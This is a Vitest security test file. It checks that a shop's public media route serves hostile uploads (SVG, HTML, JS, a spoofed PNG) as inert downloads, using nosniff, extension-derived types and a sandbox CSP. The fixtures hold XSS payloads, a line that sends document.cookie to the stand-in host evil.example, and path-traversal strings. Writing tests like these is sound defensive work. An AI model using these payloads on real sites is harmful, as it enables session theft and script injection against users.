import { describe, expect, it, vi } from "vitest";
import { MEDIA_URL_PREFIX } from "./media";
import { listMedia } from "./media.server";

/**
 * Frame 30 — hostile-at-rest media must be unservable-as-script.
 *
 * Presigned uploads skip content validation (SVG is refused at issuance, but a
 * raster key can hold arbitrary bytes), so these tests drive the REAL public
 * media route handler (`src/routes/api/public/media/$.ts`) with hostile bytes
 * sitting in the (mocked) bucket and pin the serve-time neutralization:
 *
 * - content-type is extension-derived, never sniffed, never stored metadata
 * - `x-content-type-options: nosniff` on every 200
 * - SVG leaves only as `attachment` (+ sandbox CSP), never inline
 * - `.html` / `.js` keys are never inline-servable (octet-stream+attachment)
 * - query params cannot influence the content-type (the handler ignores them)
 */

const MERCHANT = "11111111-1111-4111-8111-111111111111";

const bucket = new Map<string, Blob>();

vi.mock("@/integrations/supabase/client.server", () => ({
  supabaseAdmin: {
    storage: {
      from: () => ({
        download: vi.fn(async (path: string) => {
          const blob = bucket.get(path);
          if (!blob) return { data: null, error: { message: "not_found" } };
          return { data: blob, error: null };
        }),
        list: vi.fn(async () => ({
          data: [
            {
              name: "evil-abc123.html",
              metadata: { size: 42 },
              updated_at: "2026-01-01T00:00:00.000Z",
              created_at: "2026-01-01T00:00:00.000Z",
            },
          ],
          error: null,
        })),
      }),
    },
    from: () => ({
      select: () => ({
        eq: () => ({
          in: async () => ({ data: [] }),
        }),
      }),
    }),
  },
}));

function put(path: string, body: string, storedType: string) {
  bucket.set(path, new Blob([body], { type: storedType }));
}

async function get(
  splat: string,
  extra?: { request?: Request },
): Promise<Response> {
  const { Route } = await import("@/routes/api/public/media/$");
  const route = Route as unknown as {
    options?: {
      server?: {
        handlers?: { GET?: (args: unknown) => Promise<Response> };
      };
    };
    server?: { handlers?: { GET?: (args: unknown) => Promise<Response> } };
  };
  const GET =
    route.options?.server?.handlers?.GET ?? route.server?.handlers?.GET;
  if (!GET) throw new Error("media route GET handler not found");
  return (await GET({
    params: { _splat: splat },
    ...extra,
  })) as Response;
}

describe("hostile-at-rest media cannot execute via the public media route", () => {
  it("serves SVG as attachment with sandbox CSP + nosniff, never inline", async () => {
    const hostileSvg = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script></svg>`;
    put(`${MERCHANT}/evil-abc123.svg`, hostileSvg, "image/svg+xml");

    const res = await get(`${MERCHANT}/evil-abc123.svg`);

    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toBe("image/svg+xml");
    // Never inline: a top-level navigation must download, not render+execute.
    expect(res.headers.get("content-disposition")).toBe("attachment");
    expect(res.headers.get("content-disposition")).not.toContain("inline");
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("content-security-policy")).toContain(
      "default-src 'none'",
    );
    // Serve layer neutralizes via headers only — bytes pass through untouched.
    expect(await res.text()).toBe(hostileSvg);
  });

  it("never serves a .html key inline (octet-stream + attachment + nosniff)", async () => {
    put(
      `${MERCHANT}/evil-abc123.html`,
      `<script>alert(document.domain)</script>`,
      "text/html",
    );

    const res = await get(`${MERCHANT}/evil-abc123.html`);

    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toBe("application/octet-stream");
    expect(res.headers.get("content-type")).not.toContain("text/html");
    expect(res.headers.get("content-disposition")).toBe("attachment");
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
  });

  it("never serves a .js key inline (octet-stream + attachment + nosniff)", async () => {
    put(
      `${MERCHANT}/evil-abc123.js`,
      `fetch("https://evil.example/exfil?" + document.cookie)`,
      "text/javascript",
    );

    const res = await get(`${MERCHANT}/evil-abc123.js`);

    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toBe("application/octet-stream");
    expect(res.headers.get("content-disposition")).toBe("attachment");
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
  });

  it("serves spoofed logo.png (script bytes, html stored type) as image/png with nosniff", async () => {
    const scriptBytes = `<script>alert(1)</script>`;
    // Stored object metadata claims text/html; the route must ignore it.
    put(`${MERCHANT}/logo-abc123.png`, scriptBytes, "text/html");

    const res = await get(`${MERCHANT}/logo-abc123.png`);

    expect(res.status).toBe(200);
    // Extension-derived, not sniffed, not the stored text/html.
    expect(res.headers.get("content-type")).toBe("image/png");
    // nosniff stops the browser re-interpreting these bytes as HTML.
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    // Bytes are untouched: hostile-but-unservable at rest, inert on the wire.
    expect(await res.text()).toBe(scriptBytes);
  });

  it("content-type cannot be influenced by query params", async () => {
    put(`${MERCHANT}/logo-abc123.png`, "fakepngbytes", "image/png");

    const res = await get(`${MERCHANT}/logo-abc123.png`, {
      request: new Request(
        `https://shop.example/api/public/media/${MERCHANT}/logo-abc123.png?content-type=text/html&type=image/svg+xml`,
      ),
    });

    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toBe("image/png");
    expect(res.headers.get("content-disposition")).toBe("inline");
  });

  it("upper-case .SVG is still attachment, traversal and nesting still 404", async () => {
    put(`${MERCHANT}/EVIL-ABC123.SVG`, `<svg></svg>`, "image/svg+xml");

    const upper = await get(`${MERCHANT}/EVIL-ABC123.SVG`);
    expect(upper.status).toBe(200);
    expect(upper.headers.get("content-disposition")).toBe("attachment");

    for (const bad of [
      `${MERCHANT}/../secrets.png`,
      `${MERCHANT}/nested/evil.png`,
      `${MERCHANT}/..%2Fetc.png`,
      `not-a-uuid/evil.png`,
    ]) {
      const res = await get(bad);
      expect(res.status).toBe(404);
    }
  });
});

describe("listMedia consumers receive metadata only — no serve decisions", () => {
  it("returns relative media URLs with no content-type to act on", async () => {
    const items = await listMedia(MERCHANT);

    expect(items.length).toBeGreaterThan(0);
    for (const item of items) {
      expect(item.url.startsWith(MEDIA_URL_PREFIX)).toBe(true);
      expect(item.url).not.toContain("?");
      expect(item.url).not.toContain("#");
      // No content-type / disposition fields: consumers cannot re-derive a
      // serve decision from stored metadata; the route owns typing.
      expect(item).not.toHaveProperty("contentType");
      expect(item).not.toHaveProperty("contentDisposition");
    }
  });
});
